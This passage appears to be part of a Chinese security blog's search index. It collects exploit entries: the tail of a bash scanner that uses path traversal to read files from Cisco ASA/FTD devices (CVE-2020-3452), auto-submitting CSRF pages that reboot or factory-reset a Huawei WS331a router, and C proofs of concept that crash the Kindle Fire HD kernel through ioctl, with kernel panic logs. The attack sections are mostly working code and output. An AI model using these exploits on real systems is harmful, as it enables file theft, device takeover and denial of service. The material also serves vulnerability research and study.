-w '%{http_code}\\n' -s) if [ $status -eq &quot;400&quot; ]; then echo &quot;$line/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=$read doesn't exist!&quot; else wget &quot;$line/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=$read&quot; -O $name.txt if [ -s $filename ]; then echo &quot;$line/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=$read exists, reading $read...&quot; echo &quot;downloaded!, $line is vulnerable to CVE-2020-3452.&quot; else echo &quot;not vulnerable!&quot; rm -rf $filename fi fi done &lt; &quot;$input&quot; else name=$(echo $website | cut -c9-16) filename=&quot;$name.txt&quot; status=$(curl -LI $website&quot;/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=&quot;$read -o /dev/null -w '%{http_code}\\n' -s) if [ $status -eq &quot;Bad Request&quot; ]; then echo &quot;$website/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=$read doesn't exist!&quot; else echo &quot;$website/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=$read exists, reading $read...&quot; wget &quot;$website/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=$read&quot; -O $name.txt if [ -s $filename ]; then echo &quot;downloaded!, $website is vulnerable to CVE-2020-3452.&quot; else echo &quot;not vulnerable!&quot; rm -rf $filename fi fifi","link":"/2020/09/12/IOT/Exploit/Cisco/%EF%BC%88CVE-2020-3452%EF%BC%89Cisco-ASAFTD-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"title":"（CVE-2016-6158）华为WS331a产品管理页面存在CSRF漏洞","text":"一、漏洞简介HuaweiWS331a是中国华为（Huawei）公司的一款迷你无线路由器。使用WS331a-10V100R001C01B112之前版本软件的HuaweiWS331a路由器的管理界面存在跨站请求伪造漏洞。远程攻击者可通过提交特制的请求利用该漏洞恢复出厂设置或重启设备。 二、漏洞影响WS331a-10 V100R001C02B017SP01及之前版本 三、复现过程POC实现代码如下： 当管理员登陆后，打开如下poc页面，WS331a设备将重启。 123&lt;form action=&quot;http://192.168.3.1/api/service/reboot.cgi&quot; method=&quot;post&quot;&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 当管理员登陆后，打开如下poc页面，WS331a设备将恢复初始化配置。设备自动重启后不需要密码即可连接热点，并使用amdin/admin对设备进行管理控制。 123&lt;form action=&quot;http://192.168.3.1/api/service/restoredefcfg.cgi&quot; method=&quot;post&quot;&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;","link":"/2020/09/12/IOT/Exploit/Huawei/%EF%BC%88CVE-2016-6158%EF%BC%89%E5%8D%8E%E4%B8%BAWS331a%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E/"},{"title":"（CVE-2018-11021）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞","text":"一、漏洞简介 Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/video/omap2/dsscomp/device.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ dsscomp与命令1118064517并导致内核崩溃。 要探索此漏洞，必须打开设备文件/ dev / dsscomp，并使用命令1118064517和精心设计的有效负载作为第三个参数在此设备文件上调用ioctl系统调用。 二、漏洞影响Fire OS 4.5.5.3 三、复现过程poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211/* * This is poc of Kindle Fire HD 3rd * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517. * Related buggy struct name is dsscomp_setup_dispc_data. * This Poc should run with permission to do ioctl on /dev/dsscomp. * */#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;sys/ioctl.h&gt;const static char *driver = &quot;/dev/dsscomp&quot;;static command = 1118064517; int main(int argc, char **argv, char **env) { unsigned int payload[] = { 0xffffffff, 0x00000003, 0x5d200040, 0x79900008, 0x8f5928bd, 0x78b02422, 0x00000000, 0xffffffff, 0xf4c50400, 0x007fffff, 0x8499f562, 0xffff0400, 0x001b131d, 0x60818210, 0x00000007, 0xffffffff, 0x00000000, 0x9da9041c, 0xcd980400, 0x001f03f4, 0x00000007, 0x2a34003f, 0x7c80d8f3, 0x63102627, 0xc73643a8, 0xa28f0665, 0x00000000, 0x689e57b4, 0x01ff0008, 0x5e7324b1, 0xae3b003f, 0x0b174d86, 0x00000400, 0x21ffff37, 0xceb367a4, 0x00000040, 0x00000001, 0xec000f9e, 0x00000001, 0x000001ff, 0x00000000, 0x00000000, 0x0000000f, 0x0425c069, 0x038cc3be, 0x0000000f, 0x00000080, 0xe5790100, 0x5b1bffff, 0x0000d355, 0x0000c685, 0xa0070000, 0x0010ffff, 0x00a0ff00, 0x00000001, 0xff490700, 0x0832ad03, 0x00000006, 0x00000002, 0x00000001, 0x81f871c0, 0x738019cb, 0xbf47ffff, 0x00000040, 0x00000001, 0x7f190f33, 0x00000001, 0x8295769b, 0x0000003f, 0x869f2295, 0xffffffff, 0xd673914f, 0x05055800, 0xed69b7d5, 0x00000000, 0x0107ebbd, 0xd214af8d, 0xffff4a93, 0x26450008, 0x58df0000, 0xd16db084, 0x03ff30dd, 0x00000001, 0x209aff3b, 0xe7850800, 0x00000002, 0x30da815c, 0x426f5105, 0x0de109d7, 0x2c1a65fc, 0xfcb3d75f, 0x00000000, 0x00000001, 0x8066be5b, 0x00000002, 0xffffffff, 0x5cf232ec, 0x680d1469, 0x00000001, 0x00000020, 0xffffffff, 0x00000400, 0xd1d12be8, 0x02010200, 0x01ffc16f, 0xf6e237e6, 0x007f0000, 0x01ff08f8, 0x000f00f9, 0xbad07695, 0x00000000, 0xbaff0000, 0x24040040, 0x00000006, 0x00000004, 0x00000000, 0xbc2e9242, 0x009f5f08, 0x00800000, 0x00000000, 0x00000001, 0xff8800ff, 0x00000001, 0x00000000, 0x000003f4, 0x6faa8472, 0x00000400, 0xec857dd5, 0x00000000, 0x00000040, 0xffffffff, 0x3f004874, 0x0000b77a, 0xec9acb95, 0xfacc0001, 0xffff0001, 0x0080ffff, 0x3600ff03, 0x00000001, 0x8fff7d7f, 0x6b87075a, 0x00000000, 0x41414141, 0x41414141, 0x41414141, 0x41414141, 0x001001ff, 0x00000000, 0x00000001, 0xff1f0512, 0x00000001, 0x51e32167, 0xc18c55cc, 0x00000000, 0xffffffff, 0xb4aaf12b, 0x86edfdbd, 0x00000010, 0x0000003f, 0xabff7b00, 0xffff9ea3, 0xb28e0040, 0x000fffff, 0x458603f4, 0xffff007f, 0xa9030f02, 0x00000001, 0x002cffff, 0x9e00cdff, 0x00000004, 0x41414141, 0x41414141, 0x41414141, 0x41414141 }; int fd = 0; fd = open(driver, O_RDWR); if (fd &lt; 0) { printf(&quot;Failed to open %s, with errno %d\\n&quot;, driver, errno); system(&quot;echo 1 &gt; /data/local/tmp/log&quot;); return -1; } printf(&quot;Try open %s with command 0x%x.\\n&quot;, driver, command); printf(&quot;System will crash and reboot.\\n&quot;); if(ioctl(fd, command, &amp;payload) &lt; 0) { printf(&quot;Allocation of structs failed, %d\\n&quot;, errno); system(&quot;echo 2 &gt; /data/local/tmp/log&quot;); return -1; } close(fd); return 0;} 崩溃日志 To be added here.","link":"/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11021%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"},{"title":"（CVE-2018-11023）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞","text":"一、漏洞简介 Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3的内核组件中的内核模块/omap/drivers/misc/gcx/gcioctl/gcif.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ gcioctl使用命令3222560159，并导致内核崩溃。 二、漏洞影响Fire OS 4.5.5.3 三、复现过程poc： 123456789101112131415161718192021222324252627282930313233343536/* * This is poc of Kindle Fire HD 3rd * A bug in the ioctl interface of device file /dev/gcioctl causes the system crash via IOCTL 3222560159. * This Poc should run with permission to do ioctl on /dev/gcioctl. * */#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;sys/ioctl.h&gt;const static char *driver = &quot;/dev/gcioctl&quot;;static command = 3222560159; int main(int argc, char **argv, char **env) { unsigned int payload[] = { 0x244085aa, 0x1a03e6ef, 0x000003f4, 0x00000000 }; int fd = 0; fd = open(driver, O_RDONLY); if (fd &lt; 0) { printf(&quot;Failed to open %s, with errno %d\\n&quot;, driver, errno); system(&quot;echo 1 &gt; /data/local/tmp/log&quot;); return -1; } printf(&quot;Try open %s with command 0x%x.\\n&quot;, driver, command); printf(&quot;System will crash and reboot.\\n&quot;); if(ioctl(fd, command, &amp;payload) &lt; 0) { printf(&quot;Allocation of structs failed, %d\\n&quot;, errno); system(&quot;echo 2 &gt; /data/local/tmp/log&quot;); return -1; } close(fd); return 0;} 崩溃日志 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176[ 79.825592] init: untracked pid 3232 exited[ 79.830841] init: untracked pid 3234 exited[ 95.970855] Alignment trap: not handling instruction e1953f9f at [&lt;c06a4d84&gt;][ 95.978912] Unhandled fault: alignment exception (0x001) at 0x1a03e6f3[ 95.986053] Internal error: : 1 [#1] PREEMPT SMP ARM[ 95.991638] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)[ 95.999145] CPU: 0 Tainted: G O (3.4.83-gd2afc0bae69 #1)[ 96.006408] PC is at __raw_spin_lock_irqsave+0x38/0xb0[ 96.012115] LR is at _raw_spin_lock_irqsave+0x10/0x14[ 96.017791] pc : [&lt;c06a4d88&gt;] lr : [&lt;c06a4e10&gt;] psr: 20000093[ 96.017822] sp : d02bfdd8 ip : d02bfdf8 fp : d02bfdf4[ 96.030578] r10: 00000000 r9 : dd3eeca8 r8 : 00000001[ 96.036376] r7 : 1a03e6ef r6 : 00000001 r5 : 1a03e6f3 r4 : d02be000[ 96.043701] r3 : 00000001 r2 : 00000001 r1 : 00000082 r0 : 20000013[ 96.050933] Flags: nzCv IRQs off FIQs on Mode SVC_32 ISA ARM Segment user[ 96.058990] Control: 10c5387d Table: 96cb804a DAC: 00000015[ 96.065460] [ 96.065460] PC: 0xc06a4d08:[ 96.070404] 4d08 1a000003 eaffffe6 e5903000 e3530000 0affffe3 e5903004 e3530000 1afffff9[ 96.080810] 4d28 eaffffdf e50b0018 ebfffbab e51b0018 eaffffed e1a0c00d e92dd800 e24cb004[ 96.091217] 4d48 ebffffcf e89da800 e1a0c00d e92dd878 e24cb004 e1a0300d e3c34d7f e3c4403f[ 96.101776] 4d68 e1a05000 e3a06001 e5943004 e2833001 e5843004 e10f0000 f10c0080 e1953f9f[ 96.112335] 4d88 e3330000 01853f96 e3530000 0a000014 e121f000 e5943004 e2433001 e5843004[ 96.122894] 4da8 e5943000 e3130002 1a000010 e5953004 e3530000 e5953000 05856004 e3530000[ 96.133361] 4dc8 1a000003 eaffffe7 e5953000 e3530000 0affffe4 e5953004 e3530000 1afffff9[ 96.143920] 4de8 eaffffe0 f57ff05f e5853004 e89da878 ebfffb79 eaffffec e1a0c00d e92dd800[ 96.154479] [ 96.154479] LR: 0xc06a4d90:[ 96.159393] 4d90 e3530000 0a000014 e121f000 e5943004 e2433001 e5843004 e5943000 e3130002[ 96.170013] 4db0 1a000010 e5953004 e3530000 e5953000 05856004 e3530000 1a000003 eaffffe7[ 96.180603] 4dd0 e5953000 e3530000 0affffe4 e5953004 e3530000 1afffff9 eaffffe0 f57ff05f[ 96.191070] 4df0 e5853004 e89da878 ebfffb79 eaffffec e1a0c00d e92dd800 e24cb004 ebffffcf[ 96.201690] 4e10 e89da800 e1a0c00d e92dd800 e24cb004 ebfffff6 e89da800 e1a0c00d e92dd800[ 96.212341] 4e30 e24cb004 ebfffff1 e89da800 e1a0c00d e92dd818 e24cb004 ebffffc0 e1a04000[ 96.222808] 4e50 ebe6a978 e121f004 e89da818 e1a0c00d e92dd800 e24cb004 ebfffff3 e89da800[ 96.233612] 4e70 e1a0c00d e92dd830 e24cb004 e24dd008 e1a0300d e3c34d7f e3c4403f e3a05001[ 96.244262] [ 96.244262] SP: 0xd02bfd58:[ 96.249145] fd58 00000000 0000001d 00000004 d4736f80 d4737394 c06a4d84 20000093 ffffffff[ 96.259948] fd78 d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013 00000082[ 96.270660] fd98 00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001 dd3eeca8[ 96.281311] fdb8 00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093 ffffffff[ 96.292053] fdd8 0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c[ 96.302825] fdf8 d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20[ 96.313415] fe18 d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef[ 96.323883] fe38 bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60[ 96.334533] [ 96.334533] IP: 0xd02bfd78:[ 96.339416] fd78 d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013 00000082[ 96.349853] fd98 00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001 dd3eeca8[ 96.360290] fdb8 00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093 ffffffff[ 96.370727] fdd8 0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c[ 96.381042] fdf8 d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20[ 96.391479] fe18 d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef[ 96.402008] fe38 bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60[ 96.412445] fe58 c06a319c c06a2fec d02bff04 d02bfe70 c0317c28 c06a3194 00000001 00000028[ 96.422790] [ 96.422790] FP: 0xd02bfd74:[ 96.427795] fd74 ffffffff d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013[ 96.438140] fd94 00000082 00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001[ 96.448699] fdb4 dd3eeca8 00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093[ 96.459289] fdd4 ffffffff 0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10[ 96.470031] fdf4 c06a4d5c d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008[ 96.480438] fe14 c06a4e20 d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54[ 96.490875] fe34 1a03e6ef bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c[ 96.501495] fe54 d02bfe60 c06a319c c06a2fec d02bff04 d02bfe70 c0317c28 c06a3194 00000001[ 96.512023] [ 96.512023] R4: 0xd02bdf80:[ 96.517089] df80 000003ef 61ef22a8 61ef2278 61ef22d8 00000036 c0013e08 00000000 d02bdfa8[ 96.527679] dfa0 c0013c60 c0136578 61ef22a8 61ef2278 0000000a c0186201 65490ce8 65490ce0[ 96.538208] dfc0 61ef22a8 61ef2278 61ef22d8 00000036 00000001 65393000 6253ab8c 4010f2ec[ 96.548797] dfe0 00000001 65490cd0 400f0273 400e3804 600f0010 0000000a 5788f1b0 0000000b[ 96.559356] e000 00000002 00000003 00000000 d4736f80 c0a0e840 00000000 00000015 c4fcf880[ 96.569885] e020 00000000 d02be000 c09ddc50 d4736f80 dd0be600 c1617b40 d02bfdf4 d02bfd40[ 96.580535] e040 c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000[ 96.591125] e060 005bc4c0 5ebfea7f 00000000 00000000 00000000 00000000 00000000 00000000[ 96.601684] [ 96.601684] R9: 0xdd3eec28:[ 96.606628] ec28 dd3eec28 dd3eec28 00000000 00000000 00000000 c06bc674 000200da c09dda58[ 96.617218] ec48 00000000 00000000 dd3eec50 dd3eec50 00000000 c0aa5174 c0aa5174 c0aa5148[ 96.627716] ec68 5aefd4d7 00000000 00000000 00000000 dd3eec80 00000000 00000000 00000000[ 96.638275] ec88 00200000 00000000 00000000 dd3eec94 dd3eec94 dd3d6fc0 dd3d6fc0 00000000[ 96.648864] eca8 000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400[ 96.659423] ecc8 dd3eed80 dd33ae70 00001064 00000001 0fb00000 5aefd4d7 2d2b4d15 5aefd4d7[ 96.669921] ece8 2d2b4d15 5aefd4d7 2d2b4d15 00000000 00000000 00000000 00000000 00000000[ 96.680572] ed08 00000000 00000000 00000000 00000000 00000001 00000000 00000000 dd3eed24[ 96.691162] Process gcioctl_poc_3 (pid: 3395, stack limit = 0xd02be2f8)[ 96.698455] Stack: (0xd02bfdd8 to 0xd02c0000)[ 96.703430] fdc0: 0000020a 00000082[ 96.712554] fde0: 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c d02bfe14 d02bfe08[ 96.721588] fe00: c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20 d84a38d8 d84a2800[ 96.730743] fe20: d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef bed24608 d02be000[ 96.739837] fe40: d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60 c06a319c c06a2fec[ 96.748840] fe60: d02bff04 d02bfe70 c0317c28 c06a3194 00000001 00000028 000fffff d02bfea0[ 96.757934] fe80: d02bfedc d02bfe90 c0207454 c00bd920 0000001e c33a3180 d02bfed4 d02bfea8[ 96.767059] fea0: 244085aa 1a03e6ef 000003f4 00000000 00000000 00000001 00000000 d02bff14[ 96.776214] fec0: 00000000 00000001 dd3eeca8 c24d8a00 d02bfefc d02bfee0 c02089fc 00000000[ 96.785247] fee0: d627f000 00000004 d627f000 bed24608 dd3eeca8 00000000 d02bff74 d02bff08[ 96.794403] ff00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190[ 96.803649] ff20: dcf8c770 d02bff0c d02be000 bed24638 bed24608 c0145d9f d627f000 00000004[ 96.812744] ff40: d02be000 00000000 d02bff64 00000000 bed24608 c0145d9f d627f000 00000004[ 96.821746] ff60: d02be000 00000000 d02bffa4 d02bff78 c01365e0 c0135fc4 00000000 00000000[ 96.830932] ff80: 00000400 bed24638 00010e54 00000000 00000036 c0013e08 00000000 d02bffa8[ 96.840118] ffa0: c0013c60 c0136578 bed24638 00010e54 00000004 c0145d9f bed24608 bed24608[ 96.849121] ffc0: bed24638 00010e54 00000000 00000036 00000000 00000000 00000000 bed24624[ 96.858245] ffe0: 00000000 bed245ec 00010690 0002917c 60000010 00000004 006f0063 002e006d[ 96.867340] Backtrace: [ 96.870330] [&lt;c06a4d50&gt;] (__raw_spin_lock_irqsave+0x0/0xb0) from [&lt;c06a4e10&gt;] (_raw_spin_lock_irqsave+0x10/0x14)[ 96.881591] r6:d02be000 r5:1a03e6f3 r4:00000082 r3:0000020a[ 96.888488] [&lt;c06a4e00&gt;] (_raw_spin_lock_irqsave+0x0/0x14) from [&lt;c06a4e24&gt;] (_raw_spin_lock_irq+0x10/0x14)[ 96.899291] [&lt;c06a4e14&gt;] (_raw_spin_lock_irq+0x0/0x14) from [&lt;c06a3008&gt;] (wait_for_common+0x28/0x150)[ 96.909729] [&lt;c06a2fe0&gt;] (wait_for_common+0x0/0x150) from [&lt;c06a319c&gt;] (wait_for_completion_interruptible_timeout+0x14/0x18)[ 96.922149] [&lt;c06a3188&gt;] (wait_for_completion_interruptible_timeout+0x0/0x18) from [&lt;c0317c28&gt;] (dev_ioctl+0x7ec/0x10c4)[ 96.934204] [&lt;c031743c&gt;] (dev_ioctl+0x0/0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c/0x5b4)[ 96.943481] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0/0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74/0x84)[ 96.952636] [&lt;c013656c&gt;] (sys_ioctl+0x0/0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)[ 96.961822] r8:c0013e08 r7:00000036 r6:00000000 r5:00010e54 r4:bed24638[ 96.970153] Code: e5843004 e10f0000 f10c0080 e1953f9f (e3330000) [ 96.977264] Board Information: [ 96.977264] Revision : 0001[ 96.977294] Serial : 0000000000000000[ 96.977294] SoC Information:[ 96.977294] CPU : OMAP4470[ 96.977294] Rev : ES1.0[ 96.977325] Type : HS[ 96.977325] Production ID: 0002B975-000000CC[ 96.977325] Die ID : 1CC60000-50002FFF-0B00935D-11007004[ 96.977355] [ 97.013824] ---[ end trace 2432291f2b5d99ba ]---[ 97.019195] Kernel panic - not syncing: Fatal exception[ 97.025024] CPU1: stopping[ 97.028137] Backtrace: [ 97.031311] [&lt;c0018148&gt;] (dump_backtrace+0x0/0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18/0x1c)[ 97.040679] r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950[ 97.047668] [&lt;c0698ba0&gt;] (dump_stack+0x0/0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190/0x1c4)[ 97.056884] [&lt;c0019a48&gt;] (handle_IPI+0x0/0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58/0x60)[ 97.066253] [&lt;c00084a4&gt;] (gic_handle_irq+0x0/0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40/0x70)[ 97.075561] Exception stack(0xd6cb7d28 to 0xd6cb7d70)[ 97.081237] 7d20: c1620b40 c3152ac0 d799dc70 00000000 00000000 c1620b40[ 97.090454] 7d40: d6cb6000 c4eaaf80 00000001 c4eaaf80 c1620b40 d6cb7d7c d6cb7d80 d6cb7d70[ 97.099670] 7d60: c0074004 c06a4880 60070013 ffffffff[ 97.105346] r6:ffffffff r5:60070013 r4:c06a4880 r3:c0074004[ 97.112487] [&lt;c06a485c&gt;] (_raw_spin_unlock_irq+0x0/0x50) from [&lt;c0074004&gt;] (finish_task_switch+0x58/0x12c)[ 97.123321] [&lt;c0073fac&gt;] (finish_task_switch+0x0/0x12c) from [&lt;c06a36fc&gt;] (__schedule+0x3ec/0x830)[ 97.133239] r8:c3152ac0 r7:c09ddc50 r6:d6cb6000 r5:c09b6b40 r4:c4fcf340[ 97.141143] r3:00000001[ 97.144500] [&lt;c06a3310&gt;] (__schedule+0x0/0x830) from [&lt;c06a3c24&gt;] (preempt_schedule+0x40/0x5c)[ 97.154174] [&lt;c06a3be4&gt;] (preempt_schedule+0x0/0x5c) from [&lt;c06a4808&gt;] (_raw_spin_unlock+0x48/0x4c)[ 97.164337] r4:c0a7375c r3:00000002[ 97.168731] [&lt;c06a47c0&gt;] (_raw_spin_unlock+0x0/0x4c) from [&lt;c00983d0&gt;] (futex_wake+0xfc/0x130)[ 97.178436] [&lt;c00982d4&gt;] (futex_wake+0x0/0x130) from [&lt;c0099868&gt;] (do_futex+0xf8/0x9e8)[ 97.187469] [&lt;c0099770&gt;] (do_futex+0x0/0x9e8) from [&lt;c009a1ec&gt;] (sys_futex+0x94/0x178)[ 97.196289] [&lt;c009a158&gt;] (sys_futex+0x0/0x178) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)[ 97.205871] CPU0 PC (0) : 0xc003ee38[ 97.209930] CPU0 PC (1) : 0xc003ee54[ 97.214111] CPU0 PC (2) : 0xc003ee54[ 97.218170] CPU0 PC (3) : 0xc003ee54[ 97.222229] CPU0 PC (4) : 0xc003ee54[ 97.226409] CPU0 PC (5) : 0xc003ee54[ 97.230468] CPU0 PC (6) : 0xc003ee54[ 97.234527] CPU0 PC (7) : 0xc003ee54[ 97.238739] CPU0 PC (8) : 0xc003ee54[ 97.242767] CPU0 PC (9) : 0xc003ee54[ 97.246826] CPU1 PC (0) : 0xc0019b2c[ 97.251007] CPU1 PC (1) : 0xc0019b2c[ 97.255065] CPU1 PC (2) : 0xc0019b2c[ 97.259124] CPU1 PC (3) : 0xc0019b2c[ 97.263183] CPU1 PC (4) : 0xc0019b2c[ 97.267364] CPU1 PC (5) : 0xc0019b2c[ 97.271423] CPU1 PC (6) : 0xc0019b2c[ 97.275482] CPU1 PC (7) : 0xc0019b2c[ 97.279693] CPU1 PC (8) : 0xc0019b2c[ 97.283752] CPU1 PC (9) : 0xc0019b2c[ 97.287811] [ 97.289581] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017[ 97.289611]","link":"/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11023%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"},{"title":"（CVE-2018-11025）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞","text":"一、漏洞简介 Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/mfd/twl6030-gpadc.c允许攻击者通过设备/ dev / twl6030上的ioctl的参数注入特制的参数-gpadc命令24832并导致内核崩溃。 要探索此漏洞，必须打开设备文件/ dev / twl6030-gpadc，并使用命令24832和精心设计的有效负载作为第三个参数在此设备文件上调用ioctl系统调用。 二、漏洞影响Fire OS 4.5.5.3 三、复现过程poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/* * This is poc of Kindle Fire HD 3rd * A bug in the ioctl interface of device file /dev/twl6030-gpadc causes * the system crash via IOCTL 24832. * * This Poc should run with permission to do ioctl on /dev/twl6030-gpadc. * */#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;sys/ioctl.h&gt;const static char *driver = &quot;/dev/twl6030-gpadc&quot;;static command = 24832; struct twl6030_gpadc_user_parms { int channel; int status; unsigned short result;};int main(int argc, char **argv, char **env) { struct twl6030_gpadc_user_parms payload; payload.channel = 0x9b2a9212; payload.status = 0x0; payload.result = 0x0; int fd = 0; fd = open(driver, O_RDWR); if (fd &lt; 0) { printf(&quot;Failed to open %s, with errno %d\\n&quot;, driver, errno); system(&quot;echo 1 &gt; /data/local/tmp/log&quot;); return -1; } printf(&quot;Try ioctl device file '%s', with command 0x%x and payload NULL\\n&quot;, driver, command); printf(&quot;System will crash and reboot.\\n&quot;); if(ioctl(fd, command, &amp;payload) &lt; 0) { printf(&quot;Allocation of structs failed, %d\\n&quot;, errno); system(&quot;echo 2 &gt; /data/local/tmp/log&quot;); return -1; } close(fd); return 0;} 崩溃日志 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176[18460.321624] Unable to handle kernel paging request at virtual address 4b3f25fc[18460.330139] pgd = ca210000[18460.333251] [4b3f25fc] *pgd=00000000[18460.337768] Internal error: Oops: 5 [#1] PREEMPT SMP ARM[18460.343810] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)[18460.351440] CPU: 0 Tainted: G O (3.4.83-gd2afc0bae69 #1)[18460.358825] PC is at twl6030_gpadc_ioctl+0x160/0x180[18460.364379] LR is at twl6030_gpadc_conversion+0x5c/0x484[18460.370452] pc : [&lt;c031b080&gt;] lr : [&lt;c031a950&gt;] psr: 60030013[18460.370452] sp : de94dd90 ip : 00000000 fp : de94df04[18460.383422] r10: 00000000 r9 : dcccf608 r8 : bea875ec[18460.389282] r7 : de94c000 r6 : 00000000 r5 : 00006100 r4 : bea875ec[18460.396697] r3 : fffffeb4 r2 : 4b3f2730 r1 : de94dee8 r0 : 00000001[18460.404113] Flags: nZCv IRQs on FIQs on Mode SVC_32 ISA ARM Segment user[18460.412048] Control: 10c5387d Table: 8a21004a DAC: 00000015[18460.418609] [18460.418609] PC: 0xc031b000:[18460.423583] b000 e24b101c e30f3eb4 e34f3fff e0822082 e0812102 e51220e4 e18120b3 e5973008[18460.434234] b020 e294200c 30d22003 33a03000 e3530000 0a000006 e3e0000c e24bd01c 